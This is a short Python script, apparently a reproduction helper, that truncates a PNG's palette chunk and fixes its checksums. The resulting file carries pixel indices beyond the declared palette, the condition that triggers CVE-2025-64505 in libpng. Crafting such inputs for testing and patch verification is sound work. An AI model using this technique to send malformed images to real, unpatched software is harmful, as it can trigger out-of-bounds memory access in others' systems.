#!/usr/bin/env python3
"""Truncate a PNG's PLTE chunk to N entries in place, leaving IDAT untouched.

libpng's own write API rejects writing a pixel index >= num_palette, so the
seed file is first written with a full 256-entry palette (making the
out-of-range index legal on write), then this script shrinks the on-disk
PLTE chunk's declared length - producing the "raw pixel index exceeds the
declared palette size" shape that CVE-2025-64505 requires, without ever
touching the already-compressed IDAT pixel data.
"""
import struct
import sys
import zlib

def shrink_plte(path, num_entries):
    with open(path, "rb") as f:
        data = f.read()

    sig, rest = data[:8], data[8:]
    out = [sig]
    pos = 0
    while pos < len(rest):
        length = struct.unpack(">I", rest[pos:pos + 4])[0]
        ctype = rest[pos + 4:pos + 8]
        cdata = rest[pos + 8:pos + 8 + length]
        pos += 8 + length + 4  # skip original CRC too

        if ctype == b"PLTE":
            cdata = cdata[: num_entries * 3]
            length = len(cdata)

        crc = zlib.crc32(ctype + cdata) & 0xFFFFFFFF
        out.append(struct.pack(">I", length) + ctype + cdata + struct.pack(">I", crc))

    with open(path, "wb") as f:
        f.write(b"".join(out))

if __name__ == "__main__":
    shrink_plte(sys.argv[1], int(sys.argv[2]))
